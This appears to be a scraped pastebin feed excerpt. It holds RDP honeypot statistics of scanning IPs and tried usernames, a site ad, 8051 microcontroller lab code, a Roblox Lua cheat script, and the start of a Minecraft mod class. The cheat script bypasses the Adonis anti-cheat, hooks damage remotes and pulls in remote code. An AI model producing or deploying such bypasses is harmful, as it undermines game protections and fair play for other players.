    ""China United Network Communications Corporation Limited"": 2,
    ""Telekomunikasi Indonesia"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Kisara LLC"": 2,
    ""Linode"": 18,
    ""UAB Host Baltic"": 10,
    ""Censys, Inc"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Starcrecium Limited"": 2,
    ""Alviva Holding Limited"": 12,
    ""Horizon LLC"": 8,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""EmanuelHosting LTD"": 4,
    ""Lrtc Inetnum Rent"": 2,
    ""diva-e Datacenters GmbH"": 4,
    ""Censys, Inc."": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""Censys Inc"": 2,
    ""Gstech Software Systems Pvt Ltd"": 2,
    ""sysadmin@cari.net"": 2
  },
  ""regionName"": {
    ""Tokyo"": 2,
    ""Jiangsu"": 6,
    ""Moscow"": 18,
    ""North Holland"": 24,
    ""California"": 26,
    ""Davao Region"": 2,
    ""Ho Chi Minh"": 2,
    ""Beijing"": 4,
    ""Jakarta"": 6,
    ""North West"": 8,
    ""Vilnius"": 10,
    ""\u00cele-de-France"": 6,
    ""Michigan"": 4,
    ""Hesse"": 18,
    ""Virginia"": 6,
    ""Georgia"": 8,
    ""Texas"": 2,
    ""Kaunas"": 4,
    ""New York"": 2,
    ""Uttarakhand"": 2
  },
  ""country"": {
    ""Japan"": 2,
    ""China"": 10,
    ""Russia"": 18,
    ""The Netherlands"": 24,
    ""United States"": 48,
    ""Philippines"": 2,
    ""Vietnam"": 2,
    ""Indonesia"": 6,
    ""Singapore"": 8,
    ""Lithuania"": 14,
    ""France"": 6,
    ""Germany"": 18,
    ""India"": 2
  },
  ""account"": {
    ""hello"": 28,
    ""Domain"": 44,
    ""(empty)"": 10,
    ""YglHRmXnr"": 2,
    ""emesqa"": 2,
    ""JbyoCL"": 2,
    ""Administr"": 24,
    ""Test"": 18,
    ""Administrator"": 2,
    ""lLUrRQUJU"": 2,
    ""EfeZGZ"": 2,
    ""VJeNaY"": 2,
    ""iumv56u0"": 8,
    ""beio"": 2,
    ""SyaalRjfk"": 2,
    ""TWFzre"": 2,
    ""aRRDVl"": 2,
    ""jMGmoNEuv"": 2,
    ""VynFgN"": 2,
    ""splrUt"": 2
  },
  ""keyboard"": {
    ""Unknown"": 160
  },
  ""client_build"": {
    ""Unknown"": 160
  },
  ""client_name"": {
    ""Unknown"": 160
  },
  ""ip_type"": {
    ""hosting"": 64,
    ""proxy"": 8,
    ""Unknown"": 82,
    ""mobile"": 6
  }
}"
BHSX6CsP,2024-04-23_stats.json,rdp_snitch,JSON,Tuesday 23rd of April 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""13.231.185.95"": 1,
    ""58.218.204.183"": 3,
    ""212.41.9.9"": 3,
    ""185.73.125.86"": 1,
    ""198.235.24.116"": 3,
    ""87.251.75.64"": 1,
    ""103.150.221.250"": 1,
    ""87.251.75.145"": 4,
    ""103.56.162.199"": 1,
    ""116.140.196.215"": 1,
    ""36.91.222.100"": 2,
    ""185.170.144.3"": 2,
    ""152.32.153.53"": 1,
    ""185.161.248.148"": 1,
    ""172.104.164.84"": 4,
    ""45.227.254.9"": 3,
    ""198.235.24.241"": 3,
    ""45.227.254.26"": 2,
    ""80.15.40.91"": 1,
    ""167.94.138.35"": 1,
    ""91.238.181.16"": 2,
    ""185.122.204.179"": 1,
    ""81.19.135.2"": 3,
    ""62.204.41.225"": 4,
    ""81.19.135.47"": 3,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""45.79.213.106"": 4,
    ""45.33.11.231"": 1,
    ""194.169.175.33"": 2,
    ""89.117.79.179"": 1,
    ""84.201.2.2"": 2,
    ""80.66.76.121"": 1,
    ""198.235.24.218"": 3,
    ""167.94.145.101"": 1,
    ""123.56.20.194"": 1,
    ""162.142.125.212"": 1,
    ""43.250.254.49"": 1,
    ""198.235.24.108"": 3,
    ""71.6.186.12"": 1
  },
  ""asn"": {
    ""AS16509"": 1,
    ""AS4134"": 3,
    ""AS49505"": 3,
    ""AS208091"": 7,
    ""AS396982"": 12,
    ""AS140599"": 1,
    ""AS135905"": 1,
    ""AS4837"": 1,
    ""AS7713"": 2,
    ""AS197414"": 2,
    ""AS135377"": 1,
    ""AS49202"": 1,
    ""AS63949"": 9,
    ""AS267784"": 5,
    ""AS3215"": 1,
    ""AS398324"": 2,
    ""AS49434"": 2,
    ""AS57523"": 1,
    ""AS209588"": 6,
    ""AS59425"": 4,
    ""AS208046"": 6,
    ""AS209605"": 2,
    ""AS40021"": 1,
    ""AS44066"": 2,
    ""AS398705"": 1,
    ""AS37963"": 1,
    ""AS133676"": 1,
    ""AS10439"": 1
  },
  ""isp"": {
    ""Amazon Technologies Inc."": 1,
    ""Chinanet"": 3,
    ""OOO \""Network of data-centers \""Selectel\"""": 3,
    ""Xhost Internet Solutions LP"": 9,
    ""Google LLC"": 12,
    ""Comfac Corporation"": 1,
    ""INETSOFT"": 1,
    ""China Unicom CHINA169 Network"": 1,
    ""PT Telekomunikasi Indonesia"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Kisara LLC"": 1,
    ""Akamai Technologies"": 4,
    ""Flyservers S.A."": 11,
    ""France Telecom Orange"": 1,
    ""Censys, Inc."": 3,
    ""Datacenter location PAR1 France"": 2,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Horizon LLC"": 4,
    ""ColocationX Ltd."": 6,
    ""Akamai Technologies, Inc."": 5,
    ""UAB Host Baltic"": 2,
    ""Nubes, LLC"": 1,
    ""www.accelerated.de"": 2,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Precious netcom pvt ltd"": 1,
    ""CariNet, Inc."": 1
  },
  ""org"": {
    ""AWS EC2 (ap-northeast-1)"": 1,
    ""Chinanet JS"": 3,
    ""Unknown"": 4,
    ""Xhostis"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 6,
    ""Comfac Corporation"": 1,
    ""iNET software one member company limited"": 1,
    ""China United Network Communications Corporation Limited"": 1,
    ""Telekomunikasi Indonesia"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Kisara LLC"": 1,
    ""Linode"": 9,
    ""UAB Host Baltic"": 5,
    ""Censys, Inc"": 1,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Starcrecium Limited"": 1,
    ""Alviva Holding Limited"": 6,
    ""Horizon LLC"": 4,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""EmanuelHosting LTD"": 2,
    ""Lrtc Inetnum Rent"": 1,
    ""diva-e Datacenters GmbH"": 2,
    ""Censys, Inc."": 1,
    ""Aliyun Computing Co., LTD"": 1,
    ""Censys Inc"": 1,
    ""Gstech Software Systems Pvt Ltd"": 1,
    ""sysadmin@cari.net"": 1
  },
  ""regionName"": {
    ""Tokyo"": 1,
    ""Jiangsu"": 3,
    ""Moscow"": 9,
    ""North Holland"": 12,
    ""California"": 13,
    ""Davao Region"": 1,
    ""Ho Chi Minh"": 1,
    ""Beijing"": 2,
    ""Jakarta"": 3,
    ""North West"": 4,
    ""Vilnius"": 5,
    ""\u00cele-de-France"": 3,
    ""Michigan"": 2,
    ""Hesse"": 9,
    ""Virginia"": 3,
    ""Georgia"": 4,
    ""Texas"": 1,
    ""Kaunas"": 2,
    ""New York"": 1,
    ""Uttarakhand"": 1
  },
  ""country"": {
    ""Japan"": 1,
    ""China"": 5,
    ""Russia"": 9,
    ""The Netherlands"": 12,
    ""United States"": 24,
    ""Philippines"": 1,
    ""Vietnam"": 1,
    ""Indonesia"": 3,
    ""Singapore"": 4,
    ""Lithuania"": 7,
    ""France"": 3,
    ""Germany"": 9,
    ""India"": 1
  },
  ""account"": {
    ""hello"": 14,
    ""Domain"": 22,
    ""(empty)"": 5,
    ""YglHRmXnr"": 1,
    ""emesqa"": 1,
    ""JbyoCL"": 1,
    ""Administr"": 12,
    ""Test"": 9,
    ""Administrator"": 1,
    ""lLUrRQUJU"": 1,
    ""EfeZGZ"": 1,
    ""VJeNaY"": 1,
    ""iumv56u0"": 4,
    ""beio"": 1,
    ""SyaalRjfk"": 1,
    ""TWFzre"": 1,
    ""aRRDVl"": 1,
    ""jMGmoNEuv"": 1,
    ""VynFgN"": 1,
    ""splrUt"": 1
  },
  ""keyboard"": {
    ""Unknown"": 80
  },
  ""client_build"": {
    ""Unknown"": 80
  },
  ""client_name"": {
    ""Unknown"": 80
  },
  ""ip_type"": {
    ""hosting"": 32,
    ""proxy"": 4,
    ""Unknown"": 41,
    ""mobile"": 3
  }
}"
iUF5pNLk,pastebin.ai - New pastebin.com alternative,xxsa,PHP,Tuesday 23rd of April 2024 07:02:31 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.x
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
............
....................."
i0CeF76d,exp_6_7_8_9,Sarthak_Dandgawhal,C,Tuesday 23rd of April 2024 06:35:48 PM CDT,"// SQUARE_WAVE_KEIL_8051

#include <reg51.h>
sbit pin = P1^0;
main()
{
      P1 = 0x00;
      TMOD = 0x09;
loop:TL0 = 0xAF;
      TH0 = 0x3C;
       pin = 1;
       TR0 = 1;
       while(TF0 == 0)  {}

       TL0 = 0xAF;
       TH0 = 0x3C;
       pin = 0;
      while(TF0 == 0)  {}  
  goto loop;
}
-------------------------------------------------------------------------------------------------------------------------
// LED interfacing

#include <reg51.h>

sbit LED = P1^0;

void delay(unsigned int y){
    unsigned int i, j;
    for(i = 0; i < y; i++) {
        for(j = 0; j < 1275; j++) {
        }
    }
}
void main(){
    while(1) {
        delay(100);
        LED = 0;
        delay(100);
        LED = 1;
    }
}
-------------------------------------------------------------------------------------------------------------------------

// DC Motor interfacing

#include<reg51.h>
#include<stdio.h>

void delay(void);

sbit motor_pin_1 = P2^0;
sbit motor_pin_2 = P2^1;

void main()
{
  do
  {
\    motor_pin_1 = 1;
    motor_pin_2 = 0; //Rotates Motor Anit Clockwise
    delay();
    motor_pin_1 = 1;
    motor_pin_2 = 1; //Stops Motor
    delay();
    motor_pin_1 = 0;
    motor_pin_2 = 1; //Rotates Motor Clockwise
    delay();
    motor_pin_1 = 0;
    motor_pin_2 = 0; //Stops Motor
    delay();
  }while(1);
}

void delay()
{
  int i,j;
  for(i=0;i<1000;i++){
    for(j=0;j<1000;j++){
    }
}
}

-------------------------------------------------------------------------------------------------------------------------
// LCD Interfacing

#include<reg51.h>
#define display_port P2
sbit rs = P3^2;
sbit rw = P3^3;
sbit e =  P3^4;

void msdelay(unsigned int time)
{
    unsigned i,j ;
    for(i=0;i<time;i++);   
    for(j=0;j<1275;j++);
}
void lcd_cmd(unsigned char command)
{
    display_port = command;
    rs= 0;
    rw=0;
    e=1;
    msdelay(1);
    e=0;
}
void lcd_data(unsigned char disp_data)
{
    display_port = disp_data;
    rs= 1;
    rw=0;
    e=1;
    msdelay(1);
    e=0;
}
void lcd_init()
{
    lcd_cmd(0x38);
    msdelay(10);
    lcd_cmd(0x0F);
    msdelay(10);
    lcd_cmd(0x01);
    msdelay(10);
    lcd_cmd(0x81);
    msdelay(10);
}
void main()
{
    unsigned char a[8]=""TESGING"";
    int l=0;
    lcd_init();
    while(a[l] != '\0')
    {
        lcd_data(a[l]);
        l++;
        msdelay(50);
    }
}

-------------------------------------------------------------------------------------------------------------------------

// Matrix Keyboard

#include<reg51.h>

#define display_port P2
sbit rs = P3^2;
sbit rw = P3^3;
sbit e =  P3^4;
sbit C4 = P1^0;
sbit C3 = P1^1;
sbit C2 = P1^2;
sbit C1 = P1^3;
sbit R4 = P1^4;
sbit R3 = P1^5;
sbit R2 = P1^6;
sbit R1 = P1^7;


void msdelay(unsigned int time)
{
    unsigned i,j ;
    for(i=0;i<time;i++)    
    for(j=0;j<1275;j++);
}
void lcd_cmd(unsigned char command)
{
    display_port = command;
    rs= 0;
    rw=0;
    e=1;
    msdelay(1);
    e=0;
}
void lcd_data(unsigned char disp_data)
{
    display_port = disp_data;
    rs= 1;
    rw=0;
    e=1;
    msdelay(1);
    e=0;
}
void lcd_init()
{
    lcd_cmd(0x38);
    msdelay(10);
    lcd_cmd(0x0F);
    msdelay(10);
    lcd_cmd(0x01);
    msdelay(10);
    lcd_cmd(0x81);
    msdelay(10);
}
void row_finder1()
{
R1=R2=R3=R4=1;
C1=C2=C3=C4=0;
if(R1==0)
lcd_data('1');
if(R2==0)
lcd_data('4');
if(R3==0)
lcd_data('7');
if(R4==0)
lcd_data('*');
}
void row_finder2()
{
R1=R2=R3=R4=1;
C1=C2=C3=C4=0;
if(R1==0)
lcd_data('2');
if(R2==0)
lcd_data('5');
if(R3==0)
lcd_data('8');
if(R4==0)
lcd_data('0');
}
void row_finder3() //Function for finding the row for column 3
{
R1=R2=R3=R4=1;
C1=C2=C3=C4=0;
if(R1==0)
lcd_data('3');
if(R2==0)
lcd_data('6');
if(R3==0)
lcd_data('9');
if(R4==0)
lcd_data('#');
}
void row_finder4() //Function for finding the row for column 4
{
R1=R2=R3=R4=1;
C1=C2=C3=C4=0;
if(R1==0)
lcd_data('A');
if(R2==0)
lcd_data('B');
if(R3==0)
lcd_data('C');
if(R4==0)
lcd_data('D');
}

void main()
{
    lcd_init();
    while(1)
    {    
        msdelay(30); 
        C1=C2=C3=C4=1;
          R1=R2=R3=R4=0;
          if(C1==0)
          row_finder1();
          else if(C2==0)
           row_finder2();
           else if(C3==0)
        row_finder3();
        else if(C4==0)
        row_finder4();
    }
}

-------------------------------------------------------------------------------------------------------------------------

"
ewBNhvbj,Critical Revengeance Script,seehuangdeung,Lua,Tuesday 23rd of April 2024 06:31:34 PM CDT,"-- Join the discord for suggestions / updates to future versions
-- https://discord.gg/56Wr5TDM5t
-- The auto mob is very buggy and doesnt work atm so I recommend not using it.
-- Some shops will kick you im not sure which tell me in discord which shop kicks you.

-- // GLOBALS

getgenv().connections = connections or {}

-- // VARIABLES

local player = game.Players.LocalPlayer

local enemiesWs = workspace.Enemies
local oresWs = workspace.Harvestables.Ores
local chestSpawnsWs = workspace.ChestSpawnLocations
local areaZonesWs = workspace.Area_Hitboxes
local shrinesWs = workspace.NewStatues
local shopsWs = workspace.Shops

local enemiesRs = game:GetService(""ReplicatedStorage"").Enemy

local receiveDamageRm = game:GetService(""ReplicatedStorage""):WaitForChild(""Remotes""):WaitForChild(""Damage"")
local combatTriggerRm = workspace:WaitForChild(""Enemies""):WaitForChild(""Grassy Fields""):WaitForChild(""Enemy""):WaitForChild(""CombatTrigger"")
local itemSetupRm = game:GetService(""ReplicatedStorage""):WaitForChild(""Remotes""):WaitForChild(""ItemSetup"")
local healRm = game:GetService(""ReplicatedStorage"").Remotes.Heal

-- // FUNCTIONS

do -- [[ GENERAL HELPERS ]]
    
    function movePlrToPosition(part, amountOfTime)

        local hrp = player.Character.HumanoidRootPart
        local newVelocity = Instance.new('LinearVelocity')
        local dis = (hrp.Position - part.Position).Magnitude

        newVelocity.MaxForce = math.huge
        newVelocity.Attachment0 = hrp.RootAttachment
        newVelocity.VectorVelocity = (part.Position - hrp.Position).Unit * 70
        newVelocity.Parent = hrp

        repeat
            newVelocity.VectorVelocity = (part.Position - hrp.Position).Unit * 70
            task.wait()
        until part == nil or part.Parent == nil or not Toggles['MOBS_AUTOFARM'].Value

        newVelocity:Destroy()
    end
end
do -- [[ FETCHER HELPERS ]]

    function getInventoryData(plr)
        plr = plr or player

    end
    function getAllMobTypes()
        local tbl = {}
        for _, folder in enemiesRs:GetChildren() do
            if not folder:IsA('Folder') then continue end
            for _, mobModel in folder:GetChildren() do
                table.insert(tbl, mobModel.Name)
            end
        end
        return tbl
    end
    function getAllZones(stringArrayBool)
        local t = {}

        for _, areaPart in areaZonesWs:GetChildren() do
            table.insert(t, areaPart.Name)
        end

        if stringArrayBool then
            return t
        else
            return areaZonesWs:GetChildren()
        end
    end
    function getInstanceChildrenAsArray(instance, ofInstanceType, excludedStrArray)
        local t = {}
        for _, child in instance:GetChildren() do
            if ofInstanceType ~= nil then
                if not child:IsA(ofInstanceType) then continue end
            end
            if excludedStrArray ~= nil then
                if table.find(excludedStrArray, child.Name) then continue end
            end
            table.insert(t, child.Name)
        end
        return t
    end
end
do -- [[ AUTOFARMS ]]

    function initMobAutoFarm()
        --This will initialize the autofarm, and will listen to a value changed event.

        Toggles['MOBS_AUTOFARM']:OnChanged(function()
            local bool = Toggles['MOBS_AUTOFARM'].Value
            print(bool)

            if bool then
                local whitelistedMobs = Options.MOBS_WHITELIST.Value

                for _, enemyModelFolder in enemiesWs:GetChildren() do
                    if not enemyModelFolder:IsA('Folder') then continue end
                    for _, enemyModel in enemyModelFolder:GetChildren() do
                        if not enemyModel:IsA('Model') then continue end
                        if not whitelistedMobs[tostring(enemyModel.Model.Value)] then continue end
                        local combatFolder = nil
                        local orbsFolder = nil

                        --warn(enemyModel.Model.Value)

                        repeat
                            player.Character:PivotTo(enemyModel.WorldPivot)
                            task.wait(.05)
                        until game.Workspace:FindFirstChild('CombatFolder') ~= nil or not Toggles['MOBS_AUTOFARM'].Value
                        --rconsoleprint('Got CombatFolder')

                        combatFolder = game.Workspace.CombatFolder
                        orbsFolder = combatFolder:WaitForChild(player.Name)

                        repeat
                            if #orbsFolder:GetChildren() == 0 then
                                --player.Character:PivotTo(enemyModel.WorldPivot * CFrame.new(0,20,0))
                            end
                            for _, orb in orbsFolder:GetChildren() do
                                repeat task.wait() until orb.PrimaryPart ~= nil
                                movePlrToPosition(orb.PrimaryPart, 2)
                                --player.Character:PivotTo(orb.WorldPivot)
                                repeat
                                    task.wait(.1)
                                    --player.Character:PivotTo(orb.WorldPivot)
                                until orb == nil or orb.Parent == nil
                            end
                            task.wait(.05)
                        until enemyModel == nil or enemyModel.Parent == nil or combatFolder == nil or not Toggles['MOBS_AUTOFARM'].Value
                    end
                end

            end
        end)

    end

    function initOreAutoFarm()
        --This will initialize the autofarm, and will listen to a value changed event.
        local function getMineableOres()
            local amountMineable = 0
            for _, ore in oresWs:GetChildren() do
                if not Options['ORES_DROPDOWN'].Value[ore.Name] then continue end
                if ore.HasOre.Value == true then amountMineable += 1 end
            end
            return amountMineable
        end

        local function getClosestOre()
            local closestOre, closestDis = nil, math.huge
            for _, ore in oresWs:GetChildren() do
                if not Options['ORES_DROPDOWN'].Value[ore.Name] then continue end
                if ore.HasOre.Value == false then continue end
                local mag = (player.Character.PrimaryPart.Position - ore.Position).Magnitude
                if mag < closestDis then
                    closestDis = mag
                    closestOre = ore
                end
            end
            return closestOre
        end

        Toggles['ORES_AUTOFARM']:OnChanged(function()
            local bool = Toggles['ORES_AUTOFARM'].Value
            print(bool)
            if bool then
                itemSetupRm:FireServer('Silver Pickaxe')
                itemSetupRm:FireServer('Titanium Pickaxe')
                local lastLoggedCFrame = player.Character.PrimaryPart.CFrame
                repeat
                    local closestOre = getClosestOre()
                    local proxPrompt = closestOre:FindFirstChildWhichIsA('ProximityPrompt')

                    repeat
                        player.Character:PivotTo(closestOre.CFrame)
                        fireproximityprompt(proxPrompt)
                        task.wait(.1)
                    until closestOre.HasOre.Value == false or not Toggles['ORES_AUTOFARM'].Value

                    task.wait(.05)
                until not Toggles['ORES_AUTOFARM'].Value

                --warn('Finalized Ores Autofarm')
                player.Character:PivotTo(lastLoggedCFrame * CFrame.new(0,5,0))
            else
            end
        end)

    end

    function initChestAutoFarm()
        local function attemptOpenChest(chestModel)
            local lastCFrame = player.Character.PrimaryPart.CFrame
            local proxPrompt = chestModel.Box.ChestPrompt
            repeat
                player.Character:PivotTo(chestModel.Box.CFrame * CFrame.new(0,1,0))
                fireproximityprompt(proxPrompt)
                task.wait(.1)
            until proxPrompt.Enabled == false or not Toggles['CHESTS_AUTOFARM'].Value or chestModel == nil
            player.Character:PivotTo(lastCFrame)
        end

        for i, chestHolder in chestSpawnsWs:GetChildren() do
            connections['chest_' .. i] = chestHolder.ChildAdded:Connect(function(child)
                task.wait(.3)
                if Toggles['CHESTS_AUTOFARM'].Value then
                    attemptOpenChest(child)
                end
            end)
        end

        Toggles['CHESTS_AUTOFARM']:OnChanged(function()
            local bool = Toggles['CHESTS_AUTOFARM'].Value
            print(bool)
            if bool then
               for _, chestHolder in chestSpawnsWs:GetChildren() do
                    local chestModel = chestHolder:FindFirstChild('Chest')
                    if not chestModel then continue end
                    if not chestModel.Box.ChestPrompt.Enabled then continue end
                    attemptOpenChest(chestModel)
                    task.wait(.02)
               end
            else
            end
        end)
    end

end
do -- [[ TELEPORTS ]] --
    function initTeleportsGui()
        local types = {
            ['TP_SHRINES'] = function(callback) player.Character:PivotTo(shrinesWs:FindFirstChild(callback).WorldPivot * CFrame.new(0,10,0)) end,
            ['TP_SHOPS'] = function(callback) player.Character:PivotTo(shopsWs:FindFirstChild(callback).WorldPivot) end
        }

        for type, func in types do
            Options[type]:OnChanged(function()
                if Options[type].Value == nil or Options[type].Value == '' then return end
                local s,e = pcall(function()
                    types[type](Options[type].Value)
                end)
                if e then warn(e) end
            end)
        end

    end
end
do -- [[ SPOOFERS ]]

    function initAntiAdonis()
        if getgenv().adonisACcustom then return end

        local function bypass()
            local isLoaded = false
            for _, v in getgc(true) do
                if typeof(v) ~= 'table' then continue end

                if rawget(v, 'indexInstance') then
                    for method, tbl in pairs(v) do
                        pcall(function()
                            if isexecutorclosure(tbl[2]) then return end
                            if iscclosure(tbl[2]) then return end
                            isLoaded = true
                            tbl[2] = function() return false end
                        end)
                    end
                end
            end

            if isLoaded then
                return true
            else
                return false
            end
        end

        -- Incase adonis takes some time to load.

        repeat
            local result = bypass()
            task.wait(3)
        until result or getgenv().adonisACcustom


        getgenv().adonisACcustom = true
        warn('Adonis Finalized')
    end

    function initSpoofRemotes()

        local remoteEventAssociations = {
            ['damage'] = function(instance, args)
                return nil
            end,
        }

        local old;old = hookmetamethod(game, ""__namecall"", function(self, ...)
            local args = {...}
            if self == receiveDamageRm then
                print(getnamecallmethod())
            end
            if getnamecallmethod() == ""FireServer"" and self == receiveDamageRm then
                print('DAMAGE CALLED')
                if args[1] == player.Character then
                    print('DAMAGE PREVENTED')
                    return nil
                end
            end

            return old(self, ...)
        end)

    end

end
do -- [[ CLEAN UP ]]
    function cleanConnections()
        for key, con in connections do
            con:Disconnect()
            connections[key] = nil
        end
        table.clear(connections)
    end
end

-- // GUI

local repo = 'https://raw.githubusercontent.com/mrchigurh/LinoriaLib/main/'
local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
local Window = Library:CreateWindow({
    Title = 'Critical Revengeance | V1',
    Center = true,
    AutoShow = true,
})
local Tabs = {

    ['Main'] = Window:AddTab('Main'),
    ['Settings'] = Window:AddTab('Settings'),
    ['UI Settings'] = Window:AddTab('UI Settings')

}

do -- [[ Mobs Autofarm Groupbox ]]
    local Groupbox = Tabs.Main:AddLeftGroupbox('Mobs Autofarm (not finished/buggy)')
    Groupbox:AddToggle('MOBS_AUTOFARM', {
        Text = 'Mobs Autofarm',
        Default = false, -- Default value (true / false)
        Tooltip = 'Will begin autofarming mobs.', -- Information shown when you hover over the toggle
    })
    Groupbox:AddDropdown('MOBS_WHITELIST', {
        Values = getAllMobTypes(),
        Default = 0, -- number index of the value / string
        Multi = true, -- true / false, allows multiple choices to be selected
        Compact = true,
        Text = 'Mobs Whitelist',
        Tooltip = 'Mobs Whitelist. Select none for all.', -- Information shown when you hover over the dropdown
    })

end

do -- [[ Ores Autofarm Groupbox ]]
    local Groupbox = Tabs.Main:AddLeftGroupbox('Ores Autofarm')
    Groupbox:AddToggle('ORES_AUTOFARM', {
        Text = 'Ores Autofarm',
        Default = false, -- Default value (true / false)
        Tooltip = 'Will begin autofarming ores.', -- Information shown when you hover over the toggle
    })

    Groupbox:AddDropdown('ORES_DROPDOWN', {
        Values = { 'Copper', 'Gold', 'Silver', 'Titanium', 'Uranium' },
        Default = 1, -- number index of the value / string
        Multi = true, -- true / false, allows multiple choices to be selected

        Text = 'Ores Whitelist',
        Tooltip = 'Select the ores you want to automine.', -- Information shown when you hover over the dropdown
    })

end

do -- [[ Chests Autofarm Groupbox ]]
    local Groupbox = Tabs.Main:AddLeftGroupbox('Chests Autofarm')
    Groupbox:AddToggle('CHESTS_AUTOFARM', {
        Text = 'Chests Autofarm',
        Default = false, -- Default value (true / false)
        Tooltip = 'Will begin autofarming chests.', -- Information shown when you hover over the toggle
    })
end

do -- [[ Teleports Groupbox ]]
    local Groupbox = Tabs.Main:AddRightGroupbox('Teleports')
    Groupbox:AddDropdown('TP_SHRINES', {
        Values = getInstanceChildrenAsArray(shrinesWs),
        Default = 0, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected

        Text = 'Shrines',
    })
    Groupbox:AddDropdown('TP_SHOPS', {
        Values = getInstanceChildrenAsArray(shopsWs, 'Model', {'MM BMarket Shop', 'BMarket Shop'}),
        Default = 0, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected

        Text = 'Shops',
    })
end


do -- [[ Final Load ]]
    Library:OnUnload(function()
        print('Unloaded!')
        Library.Unloaded = true
    end)

    local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
    MenuGroup:AddButton('Unload', function() Library:Unload() end)
    MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'LeftAlt', NoUI = true, Text = 'Menu keybind' })
    ThemeManager:SetLibrary(Library)
    SaveManager:SetLibrary(Library)
    SaveManager:IgnoreThemeSettings()
    SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
    ThemeManager:SetFolder('linoria_lib')
    SaveManager:SetFolder('linoria_lib/Critical_Revengeance')
    SaveManager:BuildConfigSection(Tabs['UI Settings'])
    ThemeManager:ApplyToTab(Tabs['UI Settings'])
    SaveManager:LoadAutoloadConfig()
    Library.ToggleKeybind = Options.MenuKeybind
end

-- // MAIN

task.defer(function()
    initAntiAdonis()
end)
cleanConnections()
initTeleportsGui()
initMobAutoFarm()
initOreAutoFarm()
initChestAutoFarm()"
DjJqnHX4,Sea Otter 2,jayhillx,Java,Tuesday 23rd of April 2024 06:30:11 PM CDT,"package com.mysticsbiomes.common.entity.animal;

import com.mysticsbiomes.init.MysticEntities;
import com.mysticsbiomes.init.MysticItems;
import net.minecraft.core.BlockPos;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.syncher.EntityDataAccessor;
import net.minecraft.network.syncher.EntityDataSerializers;
import net.minecraft.network.syncher.SynchedEntityData;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.util.Mth;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.InteractionResult;
import net.minecraft.world.entity.*;
import net.minecraft.world.entity.ai.attributes.AttributeSupplier;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.entity.ai.behavior.BehaviorUtils;
import net.minecraft.world.entity.ai.control.MoveControl;
import net.minecraft.world.entity.ai.control.SmoothSwimmingLookControl;
import net.minecraft.world.entity.ai.control.SmoothSwimmingMoveControl;
import net.minecraft.world.entity.ai.goal.*;
import net.minecraft.world.entity.ai.navigation.PathNavigation;
import net.minecraft.world.entity.ai.navigation.WaterBoundPathNavigation;
import net.minecraft.world.entity.ai.util.DefaultRandomPos;
import net.minecraft.world.entity.animal.Animal;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.Items;
import net.minecraft.world.item.crafting.Ingredient;
import net.minecraft.world.level.Level;
import net.minecraft.world.level.LevelReader;
import net.minecraft.world.level.block.state.BlockState;
import net.minecraft.world.level.pathfinder.BlockPathTypes;
import net.minecraft.world.level.pathfinder.PathComputationType;
import net.minecraft.world.level.pathfinder.PathFinder;
import net.minecraft.world.level.pathfinder.SwimNodeEvaluator;
import net.minecraft.world.phys.Vec3;

import javax.annotation.Nullable;
import java.util.EnumSet;

/**
 * swims on the surface.
 * only swims underwater fully when playing or searching for food.
 */
public class SeaOtter extends Animal {
    private static final EntityDataAccessor<Boolean> DATA_FLOATING_ID = SynchedEntityData.defineId(SeaOtter.class, EntityDataSerializers.BOOLEAN);
    private static final EntityDataAccessor<Boolean> DATA_SWIMMING_ID = SynchedEntityData.defineId(SeaOtter.class, EntityDataSerializers.BOOLEAN);
    int ticksSinceSearchedForFood;
    int cooldownBeforeFindingFoodAgain;
    boolean needsToSurface;

    public final AnimationState idleAnimationState = new AnimationState();

    public SeaOtter(EntityType<? extends SeaOtter> type, Level level) {
        super(type, level);
        this.setPathfindingMalus(BlockPathTypes.WATER, 0.0F);
        this.moveControl = new SeaOtter.SeaOtterMoveControl(this);
        this.lookControl = new SmoothSwimmingLookControl(this, 10);
    }

    protected void defineSynchedData() {
        super.defineSynchedData();
        this.entityData.define(DATA_FLOATING_ID, false);
        this.entityData.define(DATA_SWIMMING_ID, false);
    }

    protected void registerGoals() {
        this.goalSelector.addGoal(1, new SeaOtter.SearchForFoodGoal());
        this.goalSelector.addGoal(2, new SeaOtter.FloatAtSurfaceGoal());
        this.goalSelector.addGoal(2, new SeaOtter.SwimToSurfaceGoal(this, 1.0D, 16));
